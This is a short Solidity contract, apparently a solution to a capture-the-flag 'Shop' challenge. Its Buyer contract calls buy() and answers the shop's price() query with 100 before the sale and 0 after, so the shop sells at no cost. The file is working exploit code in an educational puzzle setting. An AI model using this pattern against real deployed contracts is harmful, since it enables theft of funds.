pragma solidity ^0.8.0;

interface Shop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract Buyer {
    Shop shop;

    function attack(address _shop) external {
        shop = Shop(_shop);
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return 100;
        }
        else {
            return 0;
        }
    }
}
